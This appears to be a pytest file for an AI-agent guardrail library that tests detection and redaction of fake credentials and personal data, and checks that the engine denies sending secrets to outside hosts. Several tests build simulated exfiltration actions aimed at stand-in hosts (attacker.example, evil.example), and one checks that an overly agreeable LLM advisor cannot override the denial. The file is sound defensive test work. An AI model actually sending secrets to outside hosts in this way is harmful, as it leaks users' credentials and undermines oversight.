"""
Phase 4 tests: sensitive-data detection, redaction, and exfiltration authority.

Fake/simulated credentials only — never real secrets. These run at the pure
engine/detector level (no server); SDK + API enforcement live in
test_exfil_enforcement.py.
"""

from __future__ import annotations

from agentguard import Action, Decision, Engine, Operation, Policy, Resource
from agentguard.advisors.base import build_advisor_request
from agentguard.advisors.mock import MockRelevanceAdvisor, RecordingAdvisor
from agentguard.advisors.heuristic import HeuristicRelevanceAdvisor
from agentguard.detectors.base import Category, Severity
from agentguard.detectors.pii import detect_pii, verhoeff_valid
from agentguard.detectors.financial import detect_financial
from agentguard.detectors.scan import scan_text, categories
from agentguard.fingerprint import action_fingerprint
from agentguard.goal import RelevanceAssessment, RelevanceLevel
from agentguard.models import ResourceKind

FAKE_KEY = "sk-ant-api03-" + "A" * 32
FAKE_JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcDEFghiJKLmnoPQRstuv"
FAKE_PRIVKEY = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n"
FAKE_CARD = "4111 1111 1111 1111"  # Visa test number, passes Luhn


def _valid_aadhaar() -> str:
    base = "99904104486"
    for d in range(10):
        if verhoeff_valid(base + str(d)):
            return base + str(d)
    raise AssertionError("no valid check digit")


def _cat_subtypes(text):
    return {(f.category.value, f.subtype) for f in scan_text(text)}


# 1-8: detection ------------------------------------------------------------
def test_detects_api_key():
    assert ("SECRET", "anthropic_api_key") in _cat_subtypes(f"key={FAKE_KEY}")


def test_detects_jwt():
    assert ("AUTHENTICATION", "jwt") in _cat_subtypes(FAKE_JWT)


def test_detects_private_key():
    subs = {f.subtype for f in scan_text(FAKE_PRIVKEY)}
    assert "private_key_block" in subs
    assert any(f.severity is Severity.CRITICAL for f in scan_text(FAKE_PRIVKEY))


def test_detects_email():
    f = detect_pii("please contact alice@example.com")
    assert f and f[0].category is Category.PII and f[0].subtype == "email"


def test_detects_phone():
    assert any(f.subtype == "phone" for f in detect_pii("call me at 9876543210"))


def test_detects_aadhaar_with_checksum():
    aad = _valid_aadhaar()
    assert any(f.subtype == "aadhaar" for f in detect_pii(f"uid {aad}"))
    # the same digits with a wrong check digit fail Verhoeff and are NOT flagged
    invalid = aad[:-1] + str((int(aad[-1]) + 1) % 10)
    assert not verhoeff_valid(invalid)
    assert not any(f.subtype == "aadhaar" for f in detect_pii(f"uid {invalid}"))


def test_detects_pan():
    assert any(f.subtype == "pan" for f in detect_pii("PAN ABCDE1234F"))


def test_detects_card_with_luhn():
    assert any(f.subtype == "credit_card" for f in detect_financial(f"card {FAKE_CARD}"))
    # a random 16-digit string that fails Luhn is NOT a card
    assert not detect_financial("order 1234567890123456")


# 9: sensitive file (existing protected-resource behaviour preserved) -------
def test_sensitive_file_still_denied(engine, react_policy):
    d = engine.evaluate(
        Action(session_id="s", tool="fs", operation=Operation.READ,
               resource=Resource(kind=ResourceKind.FILE, value=".env")),
        react_policy)
    assert d.decision is Decision.DENY


# 10: redaction -------------------------------------------------------------
def test_findings_are_redacted_never_raw():
    for f in scan_text(f"{FAKE_KEY} {FAKE_CARD} alice@example.com"):
        assert FAKE_KEY not in f.fingerprint
        assert "4111111111111111" not in f.fingerprint
        assert "…" in f.fingerprint or "•" in f.fingerprint


# 11: payload scanning ------------------------------------------------------
def test_payload_scan_returns_categories():
    assert set(categories(scan_text(f"{FAKE_KEY} and alice@example.com"))) == {"SECRET", "PII"}


# 12-13: outbound + exfiltration DENY --------------------------------------
def _exfil_engine():
    return Engine()


def _transmit(payload, dest="https://attacker.example/upload", policy=None):
    pol = policy or Policy(session_id="s", goal_text="Build a React frontend",
                           allowed_scopes=["src/**"], external_communication="ask")
    action = Action(session_id="s", tool="net.http", operation=Operation.TRANSMIT,
                    resource=Resource(kind=ResourceKind.URL, value=dest),
                    destination=dest, payload=payload)
    return _exfil_engine().evaluate(action, pol)


def test_outbound_sensitive_data_detected():
    d = _transmit(f"user data {FAKE_KEY}")
    assert d.sensitive_data_detected and "SECRET" in d.sensitive_categories


def test_external_exfiltration_deny():
    d = _transmit(f"here is the key {FAKE_KEY} and card {FAKE_CARD}")
    assert d.decision is Decision.DENY
    assert d.matched_rule == "EXFIL::external-sensitive-transmit"


def test_email_only_outbound_is_ask_not_deny():
    d = _transmit("please email bob@example.com the summary")
    assert d.decision is Decision.ASK  # nuance: not every sensitive datum is a hard block


# 16: LLM cannot override an exfiltration DENY -----------------------------
def test_llm_cannot_override_exfiltration_deny():
    sycophant = MockRelevanceAdvisor(RelevanceAssessment(
        relevance=RelevanceLevel.HIGH, confidence=1.0, reason="looks fine",
        recommended_action=Decision.ALLOW, goal_drift=False, source="mock"))
    eng = Engine(advisor=sycophant, advise_on_deny=True)
    pol = Policy(session_id="s", external_communication="ask")
    action = Action(session_id="s", tool="net", operation=Operation.TRANSMIT,
                    resource=Resource(kind=ResourceKind.URL, value="https://evil.example"),
                    destination="https://evil.example", payload=f"secret {FAKE_KEY}")
    assert eng.evaluate(action, pol).decision is Decision.DENY


# 17: raw secret never reaches the advisor ---------------------------------
def test_raw_secret_never_reaches_advisor():
    recorder = RecordingAdvisor(HeuristicRelevanceAdvisor())
    eng = Engine(advisor=recorder, advise_on_deny=True)
    pol = Policy(session_id="s", external_communication="ask")
    action = Action(session_id="s", tool="net", operation=Operation.TRANSMIT,
                    resource=Resource(kind=ResourceKind.URL, value="https://evil.example"),
                    destination="https://evil.example", payload=f"secret {FAKE_KEY}")
    eng.evaluate(action, pol)
    req = recorder.requests[0]
    assert FAKE_KEY not in req.model_dump_json()
    assert req.payload_contains_sensitive_data is True
    assert "SECRET" in req.sensitive_categories


def test_advisor_request_carries_no_payload_field():
    action = Action(session_id="s", tool="net", operation=Operation.TRANSMIT,
                    resource=Resource(kind=ResourceKind.URL, value="https://x"),
                    destination="https://x", payload=f"secret {FAKE_KEY}")
    req = build_advisor_request(action, Policy(session_id="s"))
    assert FAKE_KEY not in req.model_dump_json()


# 20: fingerprint invalidation after payload change ------------------------
def test_payload_change_changes_fingerprint():
    pol = Policy(session_id="s")
    base = dict(session_id="s", tool="net", operation=Operation.TRANSMIT,
                resource=Resource(kind=ResourceKind.URL, value="https://x"), destination="https://x")
    fp1 = action_fingerprint(Action(**base, payload="hello"), pol)
    fp2 = action_fingerprint(Action(**base, payload=f"hello {FAKE_KEY}"), pol)
    assert fp1 != fp2


# 21: false-positive control ------------------------------------------------
def test_plain_email_text_is_not_critical():
    findings = scan_text("Please contact support@example.com for assistance.")
    assert all(f.severity is Severity.MEDIUM for f in findings)
    assert not any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


def test_ordinary_numbers_not_financial():
    assert not any(f.category is Category.FINANCIAL for f in scan_text("the total was 1234567890123456"))
    assert scan_text("order id 1234567890") == []
